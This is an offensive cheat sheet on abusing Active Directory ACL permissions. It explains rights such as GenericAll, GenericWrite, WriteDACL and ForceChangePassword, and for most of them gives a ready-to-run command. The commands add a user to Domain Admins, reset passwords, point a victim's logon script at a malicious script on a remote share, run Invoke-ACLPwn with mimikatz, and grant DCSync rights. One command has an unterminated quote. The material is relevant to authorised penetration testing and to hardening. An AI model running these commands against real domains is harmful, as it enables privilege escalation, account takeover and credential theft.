# AD ACL Abuse
# Some of the Active Directory object permissions and types that we as
# attackers are interested in:
# 
# - **GenericAll** - full rights to the object (add users to a group or reset user's password);
# - **GenericWrite** - update object's attributes (i.e logon script);
# - **WriteOwner** - change object owner to attacker controlled user take over the object;
# - **WriteDACL** - modify object's ACEs and give attacker full control right over the object;
# - **AllExtendedRights** - ability to add user to a group or reset password;
# - **ForceChangePassword** - ability to change user's password;
# - **Self (Self-Membership)** - ability to add yourself to a group;


# Check ACLs for user "User1"
ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show


# GenericAll on User
# We can reset user's password without knowing the current password; 


# GenericAll on Group
# Effectively, this allows us to add ourselves (the user spotless) to the
# Domain Admin group:
net group "domain admins" spotless /add /domain;


# WriteProperty on Group
# We can again add ourselves to the Domain Admins group and escalate
# privileges:
net user spotless /domain;
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local";
net user spotless /domain;


# Self (Self-Membership) on Group
# Another privilege that enables the attacker adding themselves to a group;

# ForceChangePassword
# We can reset the user's password without knowing their current password
$c = Get-Credential;Set-DomainUserPassword -Identity changeme -AccountPassword $c.Password -Verbose;

# GenericWrite on User
# WriteProperty on an ObjectType, which in this
# particular case is Script-Path, allows the attacker to overwrite the
# logon script path of the delegate user, which means that the next time,
# when the user delegate logs on, their system will execute our malicious
# script:
Set-ADObject -SamAccountName delegate -PropertyName scriptpath \
-PropertyValue "\\10.0.0.5\totallyLegitScript.ps1;

# WriteDACL
## It is possible to add any given account as a
## replication partner of the domain by applying the following extended
## rights Replicating Directory Changes/Replicating Directory Changes All.

## Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs
in Active Directory that are unsafe configured:
./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'testuser' -Domain 'xenoflux.local' -Password 'Welcome01!'

## Give DCSync right to the user titi
Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
